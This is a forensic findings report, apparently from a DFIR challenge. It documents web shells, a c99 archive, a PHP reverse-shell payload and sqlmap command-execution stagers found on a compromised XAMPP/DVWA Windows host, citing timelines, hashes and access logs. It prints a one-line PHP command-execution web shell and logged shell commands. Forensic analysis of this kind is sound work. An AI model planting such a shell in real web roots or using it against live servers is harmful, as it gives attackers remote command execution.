# Leftovers and malware findings — sf6df03

## Scope

Seat focus: web roots, temp/profile directories, scheduled tasks, service-related leftovers, dropped tools, and web shells.

## Confirmed attacker leftovers

### 1) Simple command web shell uploaded to DVWA uploads

- Path: `/xampp/htdocs/DVWA/hackable/uploads/phpshell.php`
- Inode: `62330-128-3`
- Timeline: `2015-09-03T07:10:15Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, line 219419)
- Content: `<?php system($_GET["cmd"]); ?>`
- Extraction command: `icat -o 2048 inputs/s4a-challenge4 62330-128-3 > work/extracted/phpshell.php`
- SHA-256: `08245eeb54a5d973b20a82e03d82556a693f5c63310e01a2f492b78dda132a99`
- Use evidence: Apache access log shows execution via `?cmd=` from `192.168.56.102`:
  - `GET /dvwa/hackable/uploads/phpshell.php?cmd=dir` at `03/Sep/2015:00:16:13 -0700` (`work/extracted/access.log`, line 7683)
  - `GET /dvwa/hackable/uploads/phpshell.php?cmd=dir C:\` at `03/Sep/2015:00:17:49 -0700` (`work/extracted/access.log`, line 7684)
  - `GET /dvwa/hackable/uploads/phpshell.php?cmd=mkdir abc` at `03/Sep/2015:00:17:58 -0700` (`work/extracted/access.log`, line 7685)

### 2) Directory created through the web shell

- Path: `/xampp/htdocs/DVWA/hackable/uploads/abc`
- Inode: `62335-144-1`
- Timeline: `2015-09-03T07:17:58Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, lines 219430-219431)
- This matches the access-log command `mkdir abc` run through `phpshell.php` (`work/extracted/access.log`, line 7685).

### 3) Larger PHP reverse-shell style payload

- Path: `/xampp/htdocs/DVWA/hackable/uploads/phpshell2.php`
- Inode: `62337-128-4`
- Timeline: `2015-09-03T07:31:30Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, line 219441)
- Extraction command: `icat -o 2048 inputs/s4a-challenge4 62337-128-4 > work/extracted/phpshell2.php`
- SHA-256: `2e77d2db6ffba49be0ccf3850ee23de61b289d1e2dfee5b79e4d04563c42a1f7`
- Content includes a reverse connection stub pointing to `192.168.56.102:4545` and `eval($b);`.
- Access evidence: `GET /dvwa/hackable/uploads/phpshell2.php` at `03/Sep/2015:00:31:54 -0700` from `192.168.56.102` (`work/extracted/access.log`, line 7716).

### 4) `webshell.php` dropped in the DVWA web root

- Path: `/xampp/htdocs/DVWA/webshell.php`
- Inode: `62334-128-1`
- M-time/C-time updated at `2015-09-03T07:14:57Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, line 219429)
- Content: `<?php system($_GET["cmd"]); ?>`
- Extraction command: `icat -o 2048 inputs/s4a-challenge4 62334-128-1 > work/extracted/webshell.php`
- SHA-256: `794f25b47b4773f6749b0f607f906e5181545eca7835a927c9a197c94c3fd74b`

### 5) `webshells.zip` archive in the DVWA web root

- Path: `/xampp/htdocs/DVWA/webshells.zip`
- Inode: `62331-128-1`
- Timeline: `2015-09-03T07:14:48Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, lines 219421-219422)
- Extraction command: `icat -o 2048 inputs/s4a-challenge4 62331-128-1 > work/extracted/webshells.zip`
- SHA-256: `bdae3070d4d9a483a8f08db4d16c9100723dea6fba3a7e53cbf249851bad99ee`
- `unzip -l` shows two payloads inside:
  - `c99.php` (153275 bytes)
  - `webshell.php` (31 bytes)
- The zip’s embedded `webshell.php` hashes to the same SHA-256 as `/xampp/htdocs/DVWA/webshell.php`.
- A `webshells` directory (`62332-144-1`) was also created at `2015-09-03T07:14:51Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, lines 219423-219424), consistent with shell archive handling.

### 6) `c99.php` interactive web shell in the DVWA web root

- Path: `/xampp/htdocs/DVWA/c99.php`
- Inode: `62333-128-3`
- Original file time: `2012-06-09T21:57:28Z`; content metadata updated during the intrusion at `2015-09-03T07:20:45Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, lines 74557, 219437)
- Extraction command: `icat -o 2048 inputs/s4a-challenge4 62333-128-3 > work/extracted/c99.php`
- SHA-256: `4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c`
- The file is `c99shell.php v.1.0 beta`, a classic feature-rich web shell.
- Access evidence from `192.168.56.102`:
  - `GET /dvwa/c99.php` at `03/Sep/2015:00:19:32 -0700` (`work/extracted/access.log`, line 7688)
  - many `?act=img&img=...` requests at `00:20:59 -0700`, which are c99 UI asset requests (`work/extracted/access.log`, lines 7689-7710)
  - `POST /dvwa/c99.php?act=cmd` at `00:21:28 -0700` and `00:21:37 -0700` (`work/extracted/access.log`, lines 7711-7712)

### 7) Deleted temp copy of c99 in Administrator profile

- Path: `/Users/Administrator/AppData/Local/Temp/c99 (2).php`
- Inode: `62338-128-4`
- Status: deleted
- Timeline: `2015-09-03T07:20:14Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, lines 219435-219436)
- Size: `153275` bytes (`catalog/s4a-challenge4/p2048/bodyfile.txt`, line 489)
- This is consistent with the attacker staging or editing a second local copy of c99 in the Administrator temp directory.

## Web attack evidence tied to leftovers

### 8) sqlmap command-execution web stagers visible in Apache access log

Even though the corresponding files were deleted before imaging, Apache logs preserve their names and usage.

- `GET /tmpbiwuc.php?cmd=echo command execution test` at `02/Sep/2015:04:25:53 -0700` from `192.168.56.102` with User-Agent `sqlmap/1.0-dev-nongit-20150902` (`work/extracted/access.log`, line 7605)
- `GET /tmpbiwuc.php?cmd=dir` at `02/Sep/2015:04:26:04 -0700` (`work/extracted/access.log`, line 7606)
- Deletion through the same shell:
  - `del /F /Q C:\xampp\htdocs\tmpukudk.php` (`work/extracted/access.log`, line 7607)
  - `del /F /Q \xampp\htdocs\tmpbiwuc.php` (`work/extracted/access.log`, line 7608)
- Second sqlmap shell name:
  - `GET /tmpbrjvl.php?cmd=echo command execution test` at `02/Sep/2015:23:52:24 -0700` (`work/extracted/access.log`, line 7662)
  - deletion of `tmpudvfh.php` and `tmpbrjvl.php` (`work/extracted/access.log`, lines 7663-7664)

This is strong evidence that sqlmap was used to obtain OS command execution through temporary PHP shells before the attacker moved to more persistent shells (`phpshell.php`, `webshell.php`, `c99.php`).

## Scheduled-task / task findings so far

- File-list review of `Windows/System32/Tasks/` currently shows only Microsoft task folders and stock-looking task files plus `Windows/Tasks/SA.DAT` and `Windows/Tasks/SCHEDLGU.TXT` (`catalog/s4a-challenge4/p2048/filelist.txt`, lines 40089-40132 and 40968-40969).
- Memory command lines show two `taskeng.exe` processes running with GUIDs (`catalog/memdump.mem/cmdline.txt`, PIDs `1984` and `1444`), but I have not yet mapped those GUIDs to specific task definitions.
- I extracted `Windows/Tasks/SCHEDLGU.TXT` with `icat -o 2048 inputs/s4a-challenge4 30754-128-3 > work/extracted/SCHEDLGU.TXT`.
  - SHA-256: `7af28c80a4b4d168272017df5fa72b300cdb3d3c3853163c9336412713d7843c`
  - The file is UTF-16LE task-scheduler service history and, in the lines reviewed so far, shows service start/exit times only rather than a clear attacker-created task name. I have not found evidence of a non-Microsoft persistence task from the on-disk task files.

## Additional leftover artifacts

### 9) XAMPP PHP session files preserve DVWA state during the attack window

Representative session extracts:

- `/xampp/tmp/sess_gt9jmpq3k9h0hbtrpiqgrj0nc0` (inode `62326-128-1`)
  - Modified at `2015-09-03T07:03:41Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, line 219392)
  - Extraction command: `icat -o 2048 inputs/s4a-challenge4 62326-128-1 > work/extracted/sess_62326.txt`
  - SHA-256: `410cee158497bb05195061ffa2776605b7a8b72e3166dcb96d830481b8d0c6a1`
  - Content: `dvwa|a:2:{s:8:"messages";a:0:{}s:8:"username";s:5:"admin";}`
- `/xampp/tmp/sess_14fe301rno6vq8tsiicedeua01` (inode `60467-128-1`)
  - Modified at `2015-09-03T07:31:30Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, line 219440)
  - Extraction command: `icat -o 2048 inputs/s4a-challenge4 60467-128-1 > work/extracted/sess_60467.txt`
  - SHA-256: `410cee158497bb05195061ffa2776605b7a8b72e3166dcb96d830481b8d0c6a1`
  - Same content as above, preserving an authenticated DVWA `admin` session during the web-shell activity window.
- Representative sqlmap-session-storm file `/xampp/tmp/sess_bdkh3ftaqjh5gp1psuk7k8o483` (inode `62288-128-1`)
  - Created at `2015-09-02T11:19:31Z` (`catalog/s4a-challenge4/p2048/timeline.csv`, line 219306)
  - Extraction command: `icat -o 2048 inputs/s4a-challenge4 62288-128-1 > work/extracted/sess_62288.txt`
  - SHA-256: `09c00c00a5c196c4247d40f742f5c4b15eac5d20204ad3cf6442e77c888a17e1`
  - Content: `dvwa|a:0:{}`

These session files do not identify the remote user by IP, but they corroborate active DVWA session churn around the sqlmap and web-shell intrusion windows.

### 10) Small text note/test file in Administrator profile

- Path: `/Users/Administrator/data.txt`
- Inode: `60464-128-1`
- Timeline: `2015-09-02T09:32:42Z` create / `2015-09-02T09:32:47Z` modify (`catalog/s4a-challenge4/p2048/timeline.csv`, lines for inode `60464-128-1`)
- Extraction command: `icat -o 2048 inputs/s4a-challenge4 60464-128-1 > work/extracted/data.txt`
- SHA-256: `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824`
- Content: `hello`
- This appears to be a trivial user-created test file rather than malware, but it is a leftover artifact in the Administrator profile during the attack period and may be relevant for the bonus list of attacker-added files depending on timeline correlation.

## Service / listener context relevant to leftovers

- Memory shows the web stack active at capture time:
  - `httpd.exe` listening on `80` and `443` (`catalog/memdump.mem/netscan.txt`, lines 20-25)
  - `mysqld.exe` listening on `3306` (`catalog/memdump.mem/netscan.txt`, lines 76-77)
  - `FileZillaServer` listening on `21` and admin port `14147` (`catalog/memdump.mem/netscan.txt`, lines 58-62)
- Apache error log confirms the running command line `c:\xampp\apache\bin\httpd.exe -d C:/xampp/apache` (`work/extracted/error.log`, lines 24-29 and 13-18 for earlier restarts).

## Open items

1. Map the running `taskeng.exe` GUIDs to concrete task names, if possible.
2. Check for additional web-root modifications or deleted attacker files not visible in the live file list.
3. Decide with disk/timeline seats whether `Users/Administrator/data.txt` should be treated as attacker-added or simply user-created noise.
